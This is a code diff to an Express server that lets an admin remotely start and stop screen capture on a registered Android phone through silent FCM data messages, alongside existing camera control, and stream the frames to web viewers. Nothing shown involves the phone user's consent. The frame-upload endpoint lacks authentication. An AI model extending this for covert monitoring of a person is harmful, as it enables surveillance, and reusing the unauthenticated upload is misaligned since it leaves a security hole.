@@ -12,6 +12,7 @@ const DB_FILE = path.join(__dirname, '..', 'db.json');
 
 // Active MJPEG stream connections
 const cameraStreams = {};
+const screenStreams = {};
 
 // Middleware
 app.use(cors());
@@ -60,7 +61,8 @@ function getUserState(db, email) {
       lastUpdated: null,
       deviceInfo: null,
       cameraSource: 'back',
-      cameraActive: false
+      cameraActive: false,
+      screenShareActive: false
     };
   } else {
     if (!db[normalizedEmail].cameraSource) {
@@ -68,6 +70,9 @@ function getUserState(db, email) {
     }
     if (db[normalizedEmail].cameraActive === undefined) {
       db[normalizedEmail].cameraActive = false;
+    }
+    if (db[normalizedEmail].screenShareActive === undefined) {
+      db[normalizedEmail].screenShareActive = false;
     }
   }
   return db[normalizedEmail];
@@ -366,6 +371,41 @@ async function triggerCameraControl(email, active, source = 'back') {
   }
 }
 
+// Helper to send screen command to device via FCM
+async function triggerScreenControl(email, active) {
+  const db = readDb();
+  const userState = db[email];
+  if (!userState || !userState.token) {
+    console.warn(`⚠️ No registered token for ${email}, cannot send screen control command.`);
+    return;
+  }
+
+  console.log(`📱 Sending screen control to ${email}: active=${active}`);
+
+  if (!isFirebaseInitialized) {
+    return; // Mock mode
+  }
+
+  const message = {
+    data: {
+      command: active ? 'START_SCREEN_SHARE' : 'STOP_SCREEN_SHARE',
+      timestamp: new Date().toISOString()
+    },
+    token: userState.token,
+    android: {
+      priority: 'high',
+      ttl: 0
+    }
+  };
+
+  try {
+    const response = await admin.messaging().send(message);
+    console.log(`✅ FCM screen command sent to ${email}:`, response);
+  } catch (error) {
+    console.error(`❌ Failed to send FCM screen command to ${email}:`, error.message);
+  }
+}
+
 // 7. GET Live Camera MJPEG Stream
 app.get('/api/camera/stream', (req, res) => {
   const { email, token } = req.query;
@@ -466,6 +506,101 @@ app.post('/api/camera/control', authenticateAdmin, async (req, res) => {
     writeDb(db);
     triggerCameraControl(normalizedEmail, true, userState.cameraSource);
     return res.json({ success: true, message: `Camera switched to ${userState.cameraSource}` });
+  }
+
+  res.status(400).json({ success: false, error: 'Invalid action' });
+});
+
+// 10. GET Live Screen MJPEG Stream
+app.get('/api/screen/stream', (req, res) => {
+  const { email, token } = req.query;
+  if (!email) {
+    return res.status(400).send('Email parameter is required');
+  }
+
+  if (token !== ADMIN_TOKEN) {
+    return res.status(403).send('Forbidden: Invalid admin token');
+  }
+
+  const normalizedEmail = email.toLowerCase().trim();
+
+  res.writeHead(200, {
+    'Content-Type': 'multipart/x-mixed-replace; boundary=--frame',
+    'Cache-Control': 'no-cache',
+    'Connection': 'close',
+    'Pragma': 'no-cache'
+  });
+
+  if (!screenStreams[normalizedEmail]) {
+    screenStreams[normalizedEmail] = [];
+  }
+
+  screenStreams[normalizedEmail].push(res);
+  console.log(`🖥️ Web client connected to screen stream for ${normalizedEmail}. Total: ${screenStreams[normalizedEmail].length}`);
+
+  req.on('close', () => {
+    screenStreams[normalizedEmail] = screenStreams[normalizedEmail].filter(c => c !== res);
+    console.log(`🖥️ Web client disconnected from screen stream for ${normalizedEmail}. Remaining: ${screenStreams[normalizedEmail].length}`);
+
+    // Auto-stop screen share on phone if no clients are viewing
+    if (screenStreams[normalizedEmail].length === 0) {
+      const db = readDb();
+      const state = getUserState(db, normalizedEmail);
+      if (state.screenShareActive) {
+        state.screenShareActive = false;
+        writeDb(db);
+        triggerScreenControl(normalizedEmail, false);
+      }
+    }
+  });
+});
+
+// 11. POST Screen Frame Upload (called by Android App)
+app.post('/api/screen/upload', express.raw({ type: 'image/jpeg', limit: '2mb' }), (req, res) => {
+  const { email } = req.query;
+  if (!email) {
+    return res.status(400).json({ success: false, error: 'Email parameter is required' });
+  }
+
+  const normalizedEmail = email.toLowerCase().trim();
+  const clients = screenStreams[normalizedEmail];
+
+  if (clients && clients.length > 0) {
+    clients.forEach(clientRes => {
+      try {
+        clientRes.write(`--frame\r\nContent-Type: image/jpeg\r\nContent-Length: ${req.body.length}\r\n\r\n`);
+        clientRes.write(req.body);
+        clientRes.write('\r\n');
+      } catch (err) {
+        console.error('Error piping screen frame to client:', err.message);
+      }
+    });
+  }
+
+  res.json({ success: true });
+});
+
+// 12. POST Screen Control (start/stop)
+app.post('/api/screen/control', authenticateAdmin, async (req, res) => {
+  const { email, action } = req.body;
+  if (!email || !action) {
+    return res.status(400).json({ success: false, error: 'Email and Action are required' });
+  }
+
+  const db = readDb();
+  const normalizedEmail = email.toLowerCase().trim();
+  const userState = getUserState(db, normalizedEmail);
+
+  if (action === 'start') {
+    userState.screenShareActive = true;
+    writeDb(db);
+    triggerScreenControl(normalizedEmail, true);
+    return res.json({ success: true, message: 'Screen share start sent' });
+  } else if (action === 'stop') {
+    userState.screenShareActive = false;
+    writeDb(db);
+    triggerScreenControl(normalizedEmail, false);
+    return res.json({ success: true, message: 'Screen share stop sent' });
   }
 
   res.status(400).json({ success: false, error: 'Invalid action' });
